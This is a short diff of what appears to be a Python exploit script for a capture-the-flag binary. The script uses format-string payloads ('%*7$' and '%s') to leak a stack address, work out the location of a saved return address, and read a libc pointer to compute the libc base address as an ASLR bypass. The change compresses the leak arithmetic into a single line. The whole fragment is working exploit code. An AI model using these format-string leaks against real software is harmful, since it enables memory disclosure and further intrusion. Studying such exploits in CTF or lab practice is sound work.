@@ -12,13 +12,10 @@ def send(arguments, fmt):
 while True:
     try:
         io = process()
-
+        
         send([0], f"%*7$".encode())
-        leak = io.recvline().decode().strip()[1:]
-        if '-' in leak: leak = int(leak) & 0xFFFFFFFF
-        else: leak = int(leak)
-        stack_leak = (0x7fff << 32) | leak
-        rip = stack_leak + 0x170
+        rip = ((0x7fff<<32) | (int(io.recvline().decode().strip()[1:],0) & 0xFFFFFFFF)) + 0x170
+
         send([rip], b'%s')
         libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x2a1ca ; break
     except: continue
